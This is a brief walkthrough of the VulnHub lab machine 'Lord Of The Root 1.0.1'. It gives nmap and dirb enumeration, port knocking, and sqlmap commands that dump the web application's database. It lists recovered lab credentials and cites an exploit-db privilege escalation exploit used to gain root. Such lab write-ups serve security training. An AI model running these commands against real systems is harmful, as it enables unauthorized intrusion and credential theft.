

# Lord Of The Root: 1.0.1 Walkthrough 

**VulnHub Link:** [Lord Of The Root: 1.0.1](https://www.vulnhub.com/entry/lord-of-the-root-101,129/)
**Difficulty:** Easy
**Release Date:** 23 Sep 2015

## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.131
```


## 2.Web Enumeration

```bash
dirb http://ip
```


knock -v 192.168.100.108 1 2 3

http://192.168.100.108:1337 opened

http://192.168.100.108:1337/sam --> view page source ---> base64 encoding found

http://192.168.100.108:1337/978345210/index.php

## 3.Exploitation

sqlmap -u 'http://192.168.100.108:1337/978345210/index.php' --dbs --forms --risk 3 --level 5 --batch

sqlmap -u 'http://192.168.100.108:1337/978345210/index.php' --dbs --forms --risk 3 --level 5 --batch -D Webapp --dump

usernames and passwords found

smeagol --> MyPreciousR00t 

## 4.Post Exploitation

with ssh , 39166.c from exploit-db --> executed

root shell opened and root flag captured
